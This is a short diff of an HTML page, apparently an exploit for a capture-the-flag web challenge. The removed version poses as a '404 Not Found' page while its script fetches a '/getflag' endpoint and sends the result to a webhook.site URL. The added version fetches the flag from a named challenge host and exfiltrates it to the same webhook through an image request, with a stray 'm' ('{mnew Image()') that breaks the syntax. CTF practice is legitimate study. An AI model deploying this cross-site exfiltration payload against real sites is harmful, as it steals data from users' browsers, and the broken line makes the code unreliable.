@@ -1,13 +1,10 @@
+<!DOCTYPE html>
 <html>
   <body>
-    <h1>404 Not Found</h1>
-    <p>This page does not exist.</p>
     <script>
-      fetch("/getflag")
-        .then(res => res.text())
-        .then(flag => {
-          fetch("https://webhook.site/45b7f639-1bad-4e43-add9-ab366290349a?flag=" + encodeURIComponent(flag));
-        });
+      fetch('http://chall.nckuctf.org:26002/getflag')
+        .then(r => r.text())
+        .then(flag => {mnew Image().src = 'https://webhook.site/45b7f639-1bad-4e43-add9-ab366290349a?flag=' + encodeURIComponent(flag); });
     </script>
   </body>
 </html>
